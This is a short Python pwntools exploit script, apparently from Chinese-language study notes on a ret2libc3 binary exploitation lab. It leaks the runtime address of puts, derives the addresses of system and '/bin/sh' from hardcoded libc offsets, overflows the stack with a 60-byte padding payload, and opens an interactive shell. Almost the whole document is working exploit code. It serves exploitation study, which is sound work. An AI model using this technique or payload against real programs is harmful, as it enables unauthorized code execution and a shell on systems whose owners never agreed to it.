from pwn import *

'''
    PWN 第三章第三节 libc3

    此章节要点:
        程序无system与'/bin/sh'片段, 但提供了libc源文件, 需通过gadget链主动泄露虚拟内存中system与'/bin/sh'的存放位置, 并并执行system('/bin/sh')实现pwn
    
    实现方式:
        1.通过静态、动态分析定位键盘输入中断时，got表中已经执行的libc函数funcA
        2.通过gadget使用输出函数（printf、read）等输出got表funcA的入口地址
        3.静态分析libc文件中funcA的text地址，并通过计算相对位置funcA与system、'/bin/sh'的相对位置得出system、'/bin/sh'的入口地址
        3.劫持栈帧EIP值, 将EIP强制跳转至调用system('/bin/sh')
'''


def ret_libc3_1(file_name='/mnt/hgfs/CyberSecurity/PWN/ROP/ret2libc3/ret2libc3'):
    print('ret_libc3 start')

    io = process([file_name])
    print(io.recv().decode())

    io.sendline('134520860')

    ''' 13000A  
        put     0x00071CD0 0xf7d6acd0
        system  0x00045830 0xF7D3E830
        /bin/sh 0x00192352
    '''
    puts_ptr = int(str.split(io.recvline().decode(), ':')[1], 16)
    print(puts_ptr)
    system_ptr = puts_ptr - (0x00071CD0 - 0x00045830)  # 0x2C4A0
    bin_sh_ptr = puts_ptr + (0x00192352 - 0x00071CD0)  # 0x120682

    print(io.recv())

    payload = b'A' * 60 + p32(system_ptr) + b'A' * 4 + p32(bin_sh_ptr)

    io.sendline(payload)

    io.interactive()
    print('ret_libc3 end')


if __name__ == '__main__':
    ret_libc3_1()
